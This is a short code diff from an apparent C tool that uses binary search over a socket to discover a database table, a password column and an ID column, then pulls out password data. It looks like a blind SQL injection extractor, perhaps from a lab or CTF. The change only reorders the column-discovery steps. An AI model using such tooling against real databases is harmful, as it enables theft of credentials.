@@ -425,6 +425,21 @@ int32_t main() {
         printf("Found Table: %s\n", table_name);
     #endif
 
+    // 3. Find Password Column
+    char pwd_name[31] = {0};
+    {
+        ColumnCtx pwd_col_ctx = {
+            .gen_ctx = {
+                .sockfd = sockfd,
+                .discovered = pwd_name
+            },
+            .table_name = table_name,
+            .col_to_find = "pwd"
+        };
+
+        binary_search(check_column, &pwd_col_ctx);
+    }
+
     // 2. Find ID Column
     char id_name[31] = {0};
     {
@@ -440,20 +455,6 @@ int32_t main() {
         binary_search(check_column, &id_ctx);
     }
 
-    // 3. Find Password Column
-    char pwd_name[31] = {0};
-    {
-        ColumnCtx pwd_col_ctx = {
-            .gen_ctx = {
-                .sockfd = sockfd,
-                .discovered = pwd_name
-            },
-            .table_name = table_name,
-            .col_to_find = "pwd"
-        };
-
-        binary_search(check_column, &pwd_col_ctx);
-    }
 
     // 4. Find Actual Password Data
     char final_password[31] = {0};
